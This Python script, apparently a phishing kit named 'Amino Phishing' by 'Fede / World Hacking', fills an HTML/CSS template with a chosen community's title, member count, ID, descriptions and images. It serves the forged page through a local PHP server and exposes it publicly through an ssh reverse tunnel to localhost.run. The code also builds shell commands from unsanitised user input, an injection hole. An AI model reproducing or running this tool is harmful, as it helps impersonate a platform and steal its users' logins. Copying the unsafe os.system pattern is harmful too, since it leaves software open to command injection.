import os
from colorama import init, Fore


def show_banner():
    print(Fore.LIGHTGREEN_EX +
          "   / \   _ __ ___ (_)_ __   ___   |  _ \| |__ (_)___| |__ (_)_ __   __ _ ")
    print("  / _ \ | '_ ` _ \| | '_ \ / _ \  | |_) | '_ \| / __| '_ \| | '_ \ / _` |")
    print(" / ___ \| | | | | | | | | | (_) | |  __/| | | | \__ \ | | | | | | | (_| |")
    print("/_/   \_\_| |_| |_|_|_| |_|\___/  |_|   |_| |_|_|___/_| |_|_|_| |_|\__, |")
    print("                                                                   |___/ "+Fore.LIGHTYELLOW_EX)

    print(Fore.LIGHTBLUE_EX+"Creado por Fede >> World Hacking <<\n"+Fore.LIGHTYELLOW_EX)


def main():
    show_banner()

    html_read_file = open("original-index/index.html", "r")
    html_read = html_read_file.readlines()
    css_read_file = open("original-index/styles.css", "r")
    css_read = css_read_file.readlines()

    os.chdir("images")
    if len(os.listdir()) == 0:
        print(Fore.LIGHTRED_EX +
              "[!] No se han encontrado imagenes en la carpeta 'images' \n"+Fore.LIGHTYELLOW_EX)
    os.chdir("..")

    os.chdir("src/img/")
    for files in os.listdir():
        os.system("rm "+files)

    os.chdir("../../")

    titulo = input("Titulo: ")
    miembros = input("Miembros: ")
    idioma = input("Idioma: ")
    _id = input("ID: ")
    short_description = input("Descripcion Corta: ")

    opc = input(
        "Desea usar un archivo para la descripcion larga? (y/N) ").lower()
    if opc == "y":
        descripcion_larga = input("Archivo Descripcion Larga: ")
        descripcion_larga = open(descripcion_larga, "r")
    else:
        descripcion_larga = input("Descripcion Larga: ")

    imagen_portada = input("Imagen Portada: ")
    if imagen_portada != "":
        os.system("cp images/"+imagen_portada+" src/img/")
    imagen_fondo = input("Imagen Fondo: ")
    if imagen_fondo != "":
        os.system("cp images/"+imagen_fondo+" src/img/")

    html_read[28] = titulo
    html_read[36] = miembros + " Miembros"
    html_read[41] = idioma
    html_read[49] = _id
    html_read[54] = short_description
    if opc == "y":
        html_read[78] = descripcion_larga.read()
    else:
        html_read[78] = descripcion_larga
    html_read[24] = "img/"+imagen_portada
    css_read[6] = 'background-image: url("../img/'+imagen_fondo+'");\n'

    html_write = open("src/index.html", "w")
    css_write = open("src/css/styles.css", "w")

    for css in css_read:
        css_write.write(css)
    for html in html_read:
        html_write.write(html)

    html_read_file.close()
    html_write.close()
    css_write.close()
    css_read_file.close()

    opc = input("Ejecutar Servidor? (y/N) ").lower()

    if opc == "y":
        os.system("cd src;php -S localhost:4546 >/dev/null 2>&1 &")
        os.system(f"ssh -R 80:localhost:4546 nokey@localhost.run")

        os.system("pkill php")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX+"\nAdios")
        os.system("pkill php")
